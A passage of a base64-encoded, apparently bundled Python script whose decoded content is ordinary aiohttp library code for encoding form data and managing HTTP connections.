gICAgICAgbmFtZTogc3RyLFxyXG4gICAgICAgIHZhbHVlOiBBbnksXHJcbiAgICAgICAgKixcclxuICAgICAgICBjb250ZW50X3R5cGU6IE9wdGlvbmFsW3N0cl0gPSBOb25lLFxyXG4gICAgICAgIGZpbGVuYW1lOiBPcHRpb25hbFtzdHJdID0gTm9uZSxcclxuICAgICAgICBjb250ZW50X3RyYW5zZmVyX2VuY29kaW5nOiBPcHRpb25hbFtzdHJdID0gTm9uZSxcclxuICAgICkgLT4gTm9uZTpcclxuXHJcbiAgICAgICAgaWYgaXNpbnN0YW5jZSh2YWx1ZSwgaW8uSU9CYXNlKTpcclxuICAgICAgICAgICAgc2VsZi5faXNfbXVsdGlwYXJ0ID0gVHJ1ZVxyXG4gICAgICAgIGVsaWYgaXNpbnN0YW5jZSh2YWx1ZSwgKGJ5dGVzLCBieXRlYXJyYXksIG1lbW9yeXZpZXcpKTpcclxuICAgICAgICAgICAgaWYgZmlsZW5hbWUgaXMgTm9uZSBhbmQgY29udGVudF90cmFuc2Zlcl9lbmNvZGluZyBpcyBOb25lOlxyXG4gICAgICAgICAgICAgICAgZmlsZW5hbWUgPSBuYW1lXHJcblxyXG4gICAgICAgIHR5cGVfb3B0aW9ucyA9IE11bHRpRGljdCh7Im5hbWUiOiBuYW1lfSkgICMgdHlwZTogTXVsdGlEaWN0W3N0cl1cclxuICAgICAgICBpZiBmaWxlbmFtZSBpcyBub3QgTm9uZSBhbmQgbm90IGlzaW5zdGFuY2UoZmlsZW5hbWUsIHN0cik6XHJcbiAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcihcclxuICAgICAgICAgICAgICAgICJmaWxlbmFtZSBtdXN0IGJlIGFuIGluc3RhbmNlIG9mIHN0ci4gIiAiR290OiAlcyIgJSBmaWxlbmFtZVxyXG4gICAgICAgICAgICApXHJcbiAgICAgICAgaWYgZmlsZW5hbWUgaXMgTm9uZSBhbmQgaXNpbnN0YW5jZSh2YWx1ZSwgaW8uSU9CYXNlKTpcclxuICAgICAgICAgICAgZmlsZW5hbWUgPSBndWVzc19maWxlbmFtZSh2YWx1ZSwgbmFtZSlcclxuICAgICAgICBpZiBmaWxlbmFtZSBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgdHlwZV9vcHRpb25zWyJmaWxlbmFtZSJdID0gZmlsZW5hbWVcclxuICAgICAgICAgICAgc2VsZi5faXNfbXVsdGlwYXJ0ID0gVHJ1ZVxyXG5cclxuICAgICAgICBoZWFkZXJzID0ge31cclxuICAgICAgICBpZiBjb250ZW50X3R5cGUgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKGNvbnRlbnRfdHlwZSwgc3RyKTpcclxuICAgICAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcihcclxuICAgICAgICAgICAgICAgICAgICAiY29udGVudF90eXBlIG11c3QgYmUgYW4gaW5zdGFuY2Ugb2Ygc3RyLiAiICJHb3Q6ICVzIiAlIGNvbnRlbnRfdHlwZVxyXG4gICAgICAgICAgICAgICAgKVxyXG4gICAgICAgICAgICBoZWFkZXJzW2hkcnMuQ09OVEVOVF9UWVBFXSA9IGNvbnRlbnRfdHlwZVxyXG4gICAgICAgICAgICBzZWxmLl9pc19tdWx0aXBhcnQgPSBUcnVlXHJcbiAgICAgICAgaWYgY29udGVudF90cmFuc2Zlcl9lbmNvZGluZyBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgaWYgbm90IGlzaW5zdGFuY2UoY29udGVudF90cmFuc2Zlcl9lbmNvZGluZywgc3RyKTpcclxuICAgICAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcihcclxuICAgICAgICAgICAgICAgICAgICAiY29udGVudF90cmFuc2Zlcl9lbmNvZGluZyBtdXN0IGJlIGFuIGluc3RhbmNlIlxyXG4gICAgICAgICAgICAgICAgICAgICIgb2Ygc3RyLiBHb3Q6ICVzIiAlIGNvbnRlbnRfdHJhbnNmZXJfZW5jb2RpbmdcclxuICAgICAgICAgICAgICAgIClcclxuICAgICAgICAgICAgaGVhZGVyc1toZHJzLkNPTlRFTlRfVFJBTlNGRVJfRU5DT0RJTkddID0gY29udGVudF90cmFuc2Zlcl9lbmNvZGluZ1xyXG4gICAgICAgICAgICBzZWxmLl9pc19tdWx0aXBhcnQgPSBUcnVlXHJcblxyXG4gICAgICAgIHNlbGYuX2ZpZWxkcy5hcHBlbmQoKHR5cGVfb3B0aW9ucywgaGVhZGVycywgdmFsdWUpKVxyXG5cclxuICAgIGRlZiBhZGRfZmllbGRzKHNlbGYsICpmaWVsZHM6IEFueSkgLT4gTm9uZTpcclxuICAgICAgICB0b19hZGQgPSBsaXN0KGZpZWxkcylcclxuXHJcbiAgICAgICAgd2hpbGUgdG9fYWRkOlxyXG4gICAgICAgICAgICByZWMgPSB0b19hZGQucG9wKDApXHJcblxyXG4gICAgICAgICAgICBpZiBpc2luc3RhbmNlKHJlYywgaW8uSU9CYXNlKTpcclxuICAgICAgICAgICAgICAgIGsgPSBndWVzc19maWxlbmFtZShyZWMsICJ1bmtub3duIilcclxuICAgICAgICAgICAgICAgIHNlbGYuYWRkX2ZpZWxkKGssIHJlYykgICMgdHlwZTogaWdub3JlW2FyZy10eXBlXVxyXG5cclxuICAgICAgICAgICAgZWxpZiBpc2luc3RhbmNlKHJlYywgKE11bHRpRGljdFByb3h5LCBNdWx0aURpY3QpKTpcclxuICAgICAgICAgICAgICAgIHRvX2FkZC5leHRlbmQocmVjLml0ZW1zKCkpXHJcblxyXG4gICAgICAgICAgICBlbGlmIGlzaW5zdGFuY2UocmVjLCAobGlzdCwgdHVwbGUpKSBhbmQgbGVuKHJlYykgPT0gMjpcclxuICAgICAgICAgICAgICAgIGssIGZwID0gcmVjXHJcbiAgICAgICAgICAgICAgICBzZWxmLmFkZF9maWVsZChrLCBmcCkgICMgdHlwZTogaWdub3JlW2FyZy10eXBlXVxyXG5cclxuICAgICAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcihcclxuICAgICAgICAgICAgICAgICAgICAiT25seSBpby5JT0Jhc2UsIG11bHRpZGljdCBhbmQgKG5hbWUsIGZpbGUpICJcclxuICAgICAgICAgICAgICAgICAgICAicGFpcnMgYWxsb3dlZCwgdXNlIC5hZGRfZmllbGQoKSBmb3IgcGFzc2luZyAiXHJcbiAgICAgICAgICAgICAgICAgICAgIm1vcmUgY29tcGxleCBwYXJhbWV0ZXJzLCBnb3QgeyFyfSIuZm9ybWF0KHJlYylcclxuICAgICAgICAgICAgICAgIClcclxuXHJcbiAgICBkZWYgX2dlbl9mb3JtX3VybGVuY29kZWQoc2VsZikgLT4gcGF5bG9hZC5CeXRlc1BheWxvYWQ6XHJcbiAgICAgICAgIyBmb3JtIGRhdGEgKHgtd3d3LWZvcm0tdXJsZW5jb2RlZClcclxuICAgICAgICBkYXRhID0gW11cclxuICAgICAgICBmb3IgdHlwZV9vcHRpb25zLCBfLCB2YWx1ZSBpbiBzZWxmLl9maWVsZHM6XHJcbiAgICAgICAgICAgIGRhdGEuYXBwZW5kKCh0eXBlX29wdGlvbnNbIm5hbWUiXSwgdmFsdWUpKVxyXG5cclxuICAgICAgICBjaGFyc2V0ID0gc2VsZi5fY2hhcnNldCBpZiBzZWxmLl9jaGFyc2V0IGlzIG5vdCBOb25lIGVsc2UgInV0Zi04IlxyXG5cclxuICAgICAgICBpZiBjaGFyc2V0ID09ICJ1dGYtOCI6XHJcbiAgICAgICAgICAgIGNvbnRlbnRfdHlwZSA9ICJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgY29udGVudF90eXBlID0gImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZDsgIiAiY2hhcnNldD0lcyIgJSBjaGFyc2V0XHJcblxyXG4gICAgICAgIHJldHVybiBwYXlsb2FkLkJ5dGVzUGF5bG9hZChcclxuICAgICAgICAgICAgdXJsZW5jb2RlKGRhdGEsIGRvc2VxPVRydWUsIGVuY29kaW5nPWNoYXJzZXQpLmVuY29kZSgpLFxyXG4gICAgICAgICAgICBjb250ZW50X3R5cGU9Y29udGVudF90eXBlLFxyXG4gICAgICAgIClcclxuXHJcbiAgICBkZWYgX2dlbl9mb3JtX2RhdGEoc2VsZikgLT4gbXVsdGlwYXJ0Lk11bHRpcGFydFdyaXRlcjpcclxuICAgICAgICAiIiJFbmNvZGUgYSBsaXN0IG9mIGZpZWxkcyB1c2luZyB0aGUgbXVsdGlwYXJ0L2Zvcm0tZGF0YSBNSU1FIGZvcm1hdCIiIlxyXG4gICAgICAgIGlmIHNlbGYuX2lzX3Byb2Nlc3NlZDpcclxuICAgICAgICAgICAgcmFpc2UgUnVudGltZUVycm9yKCJGb3JtIGRhdGEgaGFzIGJlZW4gcHJvY2Vzc2VkIGFscmVhZHkiKVxyXG4gICAgICAgIGZvciBkaXNwcGFyYW1zLCBoZWFkZXJzLCB2YWx1ZSBpbiBzZWxmLl9maWVsZHM6XHJcbiAgICAgICAgICAgIHRyeTpcclxuICAgICAgICAgICAgICAgIGlmIGhkcnMuQ09OVEVOVF9UWVBFIGluIGhlYWRlcnM6XHJcbiAgICAgICAgICAgICAgICAgICAgcGFydCA9IHBheWxvYWQuZ2V0X3BheWxvYWQoXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHZhbHVlLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBjb250ZW50X3R5cGU9aGVhZGVyc1toZHJzLkNPTlRFTlRfVFlQRV0sXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGhlYWRlcnM9aGVhZGVycyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgZW5jb2Rpbmc9c2VsZi5fY2hhcnNldCxcclxuICAgICAgICAgICAgICAgICAgICApXHJcbiAgICAgICAgICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICAgICAgICAgIHBhcnQgPSBwYXlsb2FkLmdldF9wYXlsb2FkKFxyXG4gICAgICAgICAgICAgICAgICAgICAgICB2YWx1ZSwgaGVhZGVycz1oZWFkZXJzLCBlbmNvZGluZz1zZWxmLl9jaGFyc2V0XHJcbiAgICAgICAgICAgICAgICAgICAgKVxyXG4gICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGV4YzpcclxuICAgICAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcihcclxuICAgICAgICAgICAgICAgICAgICAiQ2FuIG5vdCBzZXJpYWxpemUgdmFsdWUgdHlwZTogJXJcXG4gIlxyXG4gICAgICAgICAgICAgICAgICAgICJoZWFkZXJzOiAlclxcbiB2YWx1ZTogJXIiICUgKHR5cGUodmFsdWUpLCBoZWFkZXJzLCB2YWx1ZSlcclxuICAgICAgICAgICAgICAgICkgZnJvbSBleGNcclxuXHJcbiAgICAgICAgICAgIGlmIGRpc3BwYXJhbXM6XHJcbiAgICAgICAgICAgICAgICBwYXJ0LnNldF9jb250ZW50X2Rpc3Bvc2l0aW9uKFxyXG4gICAgICAgICAgICAgICAgICAgICJmb3JtLWRhdGEiLCBxdW90ZV9maWVsZHM9c2VsZi5fcXVvdGVfZmllbGRzLCAqKmRpc3BwYXJhbXNcclxuICAgICAgICAgICAgICAgIClcclxuICAgICAgICAgICAgICAgICMgRklYTUUgY2dpLkZpZWxkU3RvcmFnZSBkb2VzblwndCBsaWtlcyBib2R5IHBhcnRzIHdpdGhcclxuICAgICAgICAgICAgICAgICMgQ29udGVudC1MZW5ndGggd2hpY2ggd2VyZSBzZW50IHZpYSBjaHVua2VkIHRyYW5zZmVyIGVuY29kaW5nXHJcbiAgICAgICAgICAgICAgICBhc3NlcnQgcGFydC5oZWFkZXJzIGlzIG5vdCBOb25lXHJcbiAgICAgICAgICAgICAgICBwYXJ0LmhlYWRlcnMucG9wYWxsKGhkcnMuQ09OVEVOVF9MRU5HVEgsIE5vbmUpXHJcblxyXG4gICAgICAgICAgICBzZWxmLl93cml0ZXIuYXBwZW5kX3BheWxvYWQocGFydClcclxuXHJcbiAgICAgICAgc2VsZi5faXNfcHJvY2Vzc2VkID0gVHJ1ZVxyXG4gICAgICAgIHJldHVybiBzZWxmLl93cml0ZXJcclxuXHJcbiAgICBkZWYgX19jYWxsX18oc2VsZikgLT4gUGF5bG9hZDpcclxuICAgICAgICBpZiBzZWxmLl9pc19tdWx0aXBhcnQ6XHJcbiAgICAgICAgICAgIHJldHVybiBzZWxmLl9nZW5fZm9ybV9kYXRhKClcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICByZXR1cm4gc2VsZi5fZ2VuX2Zvcm1fdXJsZW5jb2RlZCgpXHJcbicpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCdhaW9odHRwL2Nvbm5lY3Rvci5weScsIGInaW1wb3J0IGFzeW5jaW9cclxuaW1wb3J0IGZ1bmN0b29sc1xyXG5pbXBvcnQgcmFuZG9tXHJcbmltcG9ydCBzeXNcclxuaW1wb3J0IHRyYWNlYmFja1xyXG5pbXBvcnQgd2FybmluZ3NcclxuZnJvbSBjb2xsZWN0aW9ucyBpbXBvcnQgZGVmYXVsdGRpY3QsIGRlcXVlXHJcbmZyb20gY29udGV4dGxpYiBpbXBvcnQgc3VwcHJlc3NcclxuZnJvbSBodHRwLmNvb2tpZXMgaW1wb3J0IFNpbXBsZUNvb2tpZVxyXG5mcm9tIGl0ZXJ0b29scyBpbXBvcnQgY3ljbGUsIGlzbGljZVxyXG5mcm9tIHRpbWUgaW1wb3J0IG1vbm90b25pY1xyXG5mcm9tIHR5cGVzIGltcG9ydCBUcmFjZWJhY2tUeXBlXHJcbmZyb20gdHlwaW5nIGltcG9ydCAoXHJcbiAgICBUWVBFX0NIRUNLSU5HLFxyXG4gICAgQW55LFxyXG4gICAgQXdhaXRhYmxlLFxyXG4gICAgQ2FsbGFibGUsXHJcbiAgICBEZWZhdWx0RGljdCxcclxuICAgIERpY3QsXHJcbiAgICBJdGVyYXRvcixcclxuICAgIExpc3QsXHJcbiAgICBPcHRpb25hbCxcclxuICAgIFNldCxcclxuICAgIFR1cGxlLFxyXG4gICAgVHlwZSxcclxuICAgIFVuaW9uLFxyXG4gICAgY2FzdCxcclxuKVxyXG5cclxuaW1wb3J0IGF0dHJcclxuXHJcbmZyb20gLiBpbXBvcnQgaGRycywgaGVscGVyc1xyXG5mcm9tIC5hYmMgaW1wb3J0IEFic3RyYWN0UmVzb2x2ZXJcclxuZnJvbSAuY2xpZW50X2V4Y2VwdGlvbnMgaW1wb3J0IChcclxuICAgIENsaWVudENvbm5lY3Rpb25FcnJvcixcclxuICAgIENsaWVudENvbm5lY3RvckNlcnRpZmljYXRlRXJyb3IsXHJcbiAgICBDbGllbnRDb25uZWN0b3JFcnJvcixcclxuICAgIENsaWVudENvbm5lY3RvclNTTEVycm9yLFxyXG4gICAgQ2xpZW50SHR0cFByb3h5RXJyb3IsXHJcbiAgICBDbGllbnRQcm94eUNvbm5lY3Rpb25FcnJvcixcclxuICAgIFNlcnZlckZpbmdlcnByaW50TWlzbWF0Y2gsXHJcbiAgICBVbml4Q2xpZW50Q29ubmVjdG9yRXJyb3IsXHJcbiAgICBjZXJ0X2Vycm9ycyxcclxuICAgIHNzbF9lcnJvcnMsXHJcbilcclxuZnJvbSAuY2xpZW50X3Byb3RvIGltcG9ydCBSZXNwb25zZUhhbmRsZXJcclxuZnJvbSAuY2xpZW50X3JlcXJlcCBpbXBvcnQgQ2xpZW50UmVxdWVzdCwgRmluZ2VycHJpbnQsIF9tZXJnZV9zc2xfcGFyYW1zXHJcbmZyb20gLmhlbHBlcnMgaW1wb3J0IChcclxuICAgIFBZXzM2LFxyXG4gICAgY2VpbF90aW1lb3V0LFxyXG4gICAgZ2V0X3J1bm5pbmdfbG9vcCxcclxuICAgIGlzX2lwX2FkZHJlc3MsXHJcbiAgICBub29wLFxyXG4gICAgc2VudGluZWwsXHJcbilcclxuZnJvbSAuaHR0cCBpbXBvcnQgUkVTUE9OU0VTXHJcbmZyb20gLmxvY2tzIGltcG9ydCBFdmVudFJlc3VsdE9yRXJyb3JcclxuZnJvbSAucmVzb2x2ZXIgaW1wb3J0IERlZmF1bHRSZXNvbHZlclxyXG5cclxudHJ5OlxyXG4gICAgaW1wb3J0IHNzbFxyXG5cclxuICAgIFNTTENvbnRleHQgPSBzc2wuU1NMQ29udGV4dFxyXG5leGNlcHQgSW1wb3J0RXJyb3I6ICAjIHByYWdtYTogbm8gY292ZXJcclxuICAgIHNzbCA9IE5vbmUgICMgdHlwZTogaWdub3JlW2Fzc2lnbm1lbnRdXHJcbiAgICBTU0xDb250ZXh0ID0gb2JqZWN0ICAjIHR5cGU6IGlnbm9yZVttaXNjLGFzc2lnbm1lbnRdXHJcblxyXG5cclxuX19hbGxfXyA9ICgiQmFzZUNvbm5lY3RvciIsICJUQ1BDb25uZWN0b3IiLCAiVW5peENvbm5lY3RvciIsICJOYW1lZFBpcGVDb25uZWN0b3IiKVxyXG5cclxuXHJcbmlmIFRZUEVfQ0hFQ0tJTkc6ICAjIHByYWdtYTogbm8gY292ZXJcclxuICAgIGZyb20gLmNsaWVudCBpbXBvcnQgQ2xpZW50VGltZW91dFxyXG4gICAgZnJvbSAuY2xpZW50X3JlcXJlcCBpbXBvcnQgQ29ubmVjdGlvbktleVxyXG4gICAgZnJvbSAudHJhY2luZyBpbXBvcnQgVHJhY2VcclxuXHJcblxyXG5jbGFzcyBfRGVwcmVjYXRpb25XYWl0ZXI6XHJcbiAgICBfX3Nsb3RzX18gPSAoIl9hd2FpdGFibGUiLCAiX2F3YWl0ZWQiKVxyXG5cclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBhd2FpdGFibGU6IEF3YWl0YWJsZVtBbnldKSAtPiBOb25lOlxyXG4gICAgICAgIHNlbGYuX2F3YWl0YWJsZSA9IGF3YWl0YWJsZVxyXG4gICAgICAgIHNlbGYuX2F3YWl0ZWQgPSBGYWxzZVxyXG5cclxuICAgIGRlZiBfX2F3YWl0X18oc2VsZikgLT4gQW55OlxyXG4gICAgICAgIHNlbGYuX2F3YWl0ZWQgPSBUcnVlXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2F3YWl0YWJsZS5fX2F3YWl0X18oKVxyXG5cclxuICAgIGRlZiBfX2RlbF9fKHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgbm90IHNlbGYuX2F3YWl0ZWQ6XHJcbiAgICAgICAgICAgIHdhcm5pbmdzLndhcm4oXHJcbiAgICAgICAgICAgICAgICAiQ29ubmVjdG9yLmNsb3NlKCkgaXMgYSBjb3JvdXRpbmUsICJcclxuICAgICAgICAgICAgICAgICJwbGVhc2UgdXNlIGF3YWl0IGNvbm5lY3Rvci5jbG9zZSgpIixcclxuICAgICAgICAgICAgICAgIERlcHJlY2F0aW9uV2FybmluZyxcclxuICAgICAgICAgICAgKVxyXG5cclxuXHJcbmNsYXNzIENvbm5lY3Rpb246XHJcblxyXG4gICAgX3NvdXJjZV90cmFjZWJhY2sgPSBOb25lXHJcbiAgICBfdHJhbnNwb3J0ID0gTm9uZVxyXG5cclxuICAgIGRlZiBfX2luaXRfXyhcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIGNvbm5lY3RvcjogIkJhc2VDb25uZWN0b3IiLFxyXG4gICAgICAgIGtleTogIkNvbm5lY3Rpb25LZXkiLFxyXG4gICAgICAgIHByb3RvY29sOiBSZXNwb25zZUhhbmRsZXIsXHJcbiAgICAgICAgbG9vcDogYXN5bmNpby5BYnN0cmFjdEV2ZW50TG9vcCxcclxuICAgICkgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLl9rZXkgPSBrZXlcclxuICAgICAgICBzZWxmLl9jb25uZWN0b3IgPSBjb25uZWN0b3JcclxuICAgICAgICBzZWxmLl9sb29wID0gbG9vcFxyXG4gICAgICAgIHNlbGYuX3Byb3RvY29sID0gcHJvdG9jb2wgICMgdHlwZTogT3B0aW9uYWxbUmVzcG9uc2VIYW5kbGVyXVxyXG4gICAgICAgIHNlbGYuX2NhbGxiYWNrcyA9IFtdICAjIHR5cGU6IExpc3RbQ2FsbGFibGVbW10sIE5vbmVdXVxyXG5cclxuICAgICAgICBpZiBsb29wLmdldF9kZWJ1ZygpOlxyXG4gICAgICAgICAgICBzZWxmLl9zb3VyY2VfdHJhY2ViYWNrID0gdHJhY2ViYWNrLmV4dHJhY3Rfc3RhY2soc3lzLl9nZXRmcmFtZSgxKSlcclxuXHJcbiAgICBkZWYgX19yZXByX18oc2VsZikgLT4gc3RyOlxyXG4gICAgICAgIHJldHVybiBmIkNvbm5lY3Rpb248e3NlbGYuX2tleX0+IlxyXG5cclxuICAgIGRlZiBfX2RlbF9fKHNlbGYsIF93YXJuaW5nczogQW55ID0gd2FybmluZ3MpIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgc2VsZi5fcHJvdG9jb2wgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIGlmIFBZXzM2OlxyXG4gICAgICAgICAgICAgICAga3dhcmdzID0geyJzb3VyY2UiOiBzZWxmfVxyXG4gICAgICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICAgICAga3dhcmdzID0ge31cclxuICAgICAgICAgICAgX3dhcm5pbmdzLndhcm4oZiJVbmNsb3NlZCBjb25uZWN0aW9uIHtzZWxmIXJ9IiwgUmVzb3VyY2VXYXJuaW5nLCAqKmt3YXJncylcclxuICAgICAgICAgICAgaWYgc2VsZi5fbG9vcC5pc19jbG9zZWQoKTpcclxuICAgICAgICAgICAgICAgIHJldHVyblxyXG5cclxuICAgICAgICAgICAgc2VsZi5fY29ubmVjdG9yLl9yZWxlYXNlKHNlbGYuX2tleSwgc2VsZi5fcHJvdG9jb2wsIHNob3VsZF9jbG9zZT1UcnVlKVxyXG5cclxuICAgICAgICAgICAgY29udGV4dCA9IHsiY2xpZW50X2Nvbm5lY3Rpb24iOiBzZWxmLCAibWVzc2FnZSI6ICJVbmNsb3NlZCBjb25uZWN0aW9uIn1cclxuICAgICAgICAgICAgaWYgc2VsZi5fc291cmNlX3RyYWNlYmFjayBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgICAgIGNvbnRleHRbInNvdXJjZV90cmFjZWJhY2siXSA9IHNlbGYuX3NvdXJjZV90cmFjZWJhY2tcclxuICAgICAgICAgICAgc2VsZi5fbG9vcC5jYWxsX2V4Y2VwdGlvbl9oYW5kbGVyKGNvbnRleHQpXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgbG9vcChzZWxmKSAtPiBhc3luY2lvLkFic3RyYWN0RXZlbnRMb29wOlxyXG4gICAgICAgIHdhcm5pbmdzLndhcm4oXHJcbiAgICAgICAgICAgICJjb25uZWN0b3IubG9vcCBwcm9wZXJ0eSBpcyBkZXByZWNhdGVkIiwgRGVwcmVjYXRpb25XYXJuaW5nLCBzdGFja2xldmVsPTJcclxuICAgICAgICApXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2xvb3BcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiB0cmFuc3BvcnQoc2VsZikgLT4gT3B0aW9uYWxbYXN5bmNpby5UcmFuc3BvcnRdOlxyXG4gICAgICAgIGlmIHNlbGYuX3Byb3RvY29sIGlzIE5vbmU6XHJcbiAgICAgICAgICAgIHJldHVybiBOb25lXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX3Byb3RvY29sLnRyYW5zcG9ydFxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIHByb3RvY29sKHNlbGYpIC0+IE9wdGlvbmFsW1Jlc3BvbnNlSGFuZGxlcl06XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX3Byb3RvY29sXHJcblxyXG4gICAgZGVmIGFkZF9jYWxsYmFjayhzZWxmLCBjYWxsYmFjazogQ2FsbGFibGVbW10sIE5vbmVdKSAtPiBOb25lOlxyXG4gICAgICAgIGlmIGNhbGxiYWNrIGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICBzZWxmLl9jYWxsYmFja3MuYXBwZW5kKGNhbGxiYWNrKVxyXG5cclxuICAgIGRlZiBfbm90aWZ5X3JlbGVhc2Uoc2VsZikgLT4gTm9uZTpcclxuICAgICAgICBjYWxsYmFja3MsIHNlbGYuX2NhbGxiYWNrcyA9IHNlbGYuX2NhbGxiYWNrc1s6XSwgW11cclxuXHJcbiAgICAgICAgZm9yIGNiIGluIGNhbGxiYWNrczpcclxuICAgICAgICAgICAgd2l0aCBzdXBwcmVzcyhFeGNlcHRpb24pOlxyXG4gICAgICAgICAgICAgICAgY2IoKVxyXG5cclxuICAgIGRlZiBjbG9zZShzZWxmKSAtPiBOb25lOlxyXG4gICAgICAgIHNlbGYuX25vdGlmeV9yZWxlYXNlKClcclxuXHJcbiAgICAgICAgaWYgc2VsZi5fcHJvdG9jb2wgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIHNlbGYuX2Nvbm5lY3Rvci5fcmVsZWFzZShzZWxmLl9rZXksIHNlbGYuX3Byb3RvY29sLCBzaG91bGRfY2xvc2U9VHJ1ZSlcclxuICAgICAgICAgICAgc2VsZi5fcHJvdG9jb2wgPSBOb25lXHJcblxyXG4gICAgZGVmIHJlbGVhc2Uoc2VsZikgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLl9ub3RpZnlfcmVsZWFzZSgpXHJcblxyXG4gICAgICAgIGlmIHNlbGYuX3Byb3RvY29sIGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICBzZWxmLl9jb25uZWN0b3IuX3JlbGVhc2UoXHJcbiAgICAgICAgICAgICAgICBzZWxmLl9rZXksIHNlbGYuX3Byb3RvY29sLCBzaG91bGRfY2xvc2U9c2VsZi5fcHJvdG9jb2wuc2hvdWxkX2Nsb3NlXHJcbiAgICAgICAgICAgIClcclxuICAgICAgICAgICAgc2VsZi5fcHJvdG9jb2wgPSBOb25lXHJcblxyXG4gICAgQHByb3BlcnR5XHJcbiAgICBkZWYgY2xvc2VkKHNlbGYpIC0+IGJvb2w6XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX3Byb3RvY29sIGlzIE5vbmUgb3Igbm90IHNlbGYuX3Byb3RvY29sLmlzX2Nvbm5lY3RlZCgpXHJcblxyXG5cclxuY2xhc3MgX1RyYW5zcG9ydFBsYWNlaG9sZGVyOlxyXG4gICAgIiIicGxhY2Vob2xkZXIgZm9yIEJhc2VDb25uZWN0b3IuY29ubmVjdCBmdW5jdGlvbiIiIlxyXG5cclxuICAgIGRlZiBjbG9zZShzZWxmKSAtPiBOb25lOlxyXG4gICAgICAgIHBhc3NcclxuXHJcblxyXG5jbGFzcyBCYXNlQ29ubmVjdG9yOlxyXG4gICAgIiIiQmFzZSBjb25uZWN0b3IgY2xhc3MuXHJcblxyXG4gICAga2VlcGFsaXZlX3RpbWVvdXQgLSAob3B0aW9uYWwpIEtlZXAtYWxpdmUgdGltZW91dC5cclxuICAgIGZvcmNlX2Nsb3NlIC0gU2V0IHRvIFRydWUgdG8gZm9yY2UgY2xvc2UgYW5kIGRvIHJlY29ubmVjdFxyXG4gICAgICAgIGFmdGVyIGVhY2ggcmVxdWVzdCAoYW5kIGJldHdlZW4gcmVkaXJlY3RzKS5cclxuICAgIGxpbWl0IC0gVGhlIHRvdGFsIG51bWJlciBvZiBzaW11bHRhbmVvdXMgY29ubmVjdGlvbnMuXHJcbiAgICBsaW1pdF9wZXJfaG9zdCAtIE51bWJlciBvZiBzaW11bHRhbmVvdXMgY29ubmVjdGlvbnMgdG8gb25lIGhvc3QuXHJcbiAgICBlbmFibGVfY2xlYW51cF9jbG9zZWQgLSBFbmFibGVzIGNsZWFuLXVwIGNsb3NlZCBzc2wgdHJhbnNwb3J0cy5cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIERpc2FibGVkIGJ5IGRlZmF1bHQuXHJcbiAgICBsb29wIC0gT3B0aW9uYWwgZXZlbnQgbG9vcC5cclxuICAgICIiIlxyXG5cclxuICAgIF9jbG9zZWQgPSBUcnVlICAjIHByZXZlbnQgQXR0cmlidXRlRXJyb3IgaW4gX19kZWxfXyBpZiBjdG9yIHdhcyBmYWlsZWRcclxuICAgIF9zb3VyY2VfdHJhY2ViYWNrID0gTm9uZVxyXG5cclxuICAgICMgYWJvcnQgdHJhbnNwb3J0IGFmdGVyIDIgc2Vjb25kcyAoY2xlYW51cCBicm9rZW4gY29ubmVjdGlvbnMpXHJcbiAgICBfY2xlYW51cF9jbG9zZWRfcGVyaW9kID0gMi4wXHJcblxyXG4gICAgZGVmIF9faW5pdF9fKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgKixcclxuICAgICAgICBrZWVwYWxpdmVfdGltZW91dDogVW5pb25bb2JqZWN0LCBOb25lLCBmbG9hdF0gPSBzZW50aW5lbCxcclxuICAgICAgICBmb3JjZV9jbG9zZTogYm9vbCA9IEZhbHNlLFxyXG4gICAgICAgIGxpbWl0OiBpbnQgPSAxMDAsXHJcbiAgICAgICAgbGltaXRfcGVyX2hvc3Q6IGludCA9IDAsXHJcbiAgICAgICAgZW5hYmxlX2NsZWFudXBfY2xvc2VkOiBib29sID0gRmFsc2UsXHJcbiAgICAgICAgbG9vcDogT3B0aW9uYWxbYXN5bmNpby5BYnN0cmFjdEV2ZW50TG9vcF0gPSBOb25lLFxyXG4gICAgKSAtPiBOb25lOlxyXG5cclxuICAgICAgICBpZiBmb3JjZV9jbG9zZTpcclxuICAgICAgICAgICAgaWYga2VlcGFsaXZlX3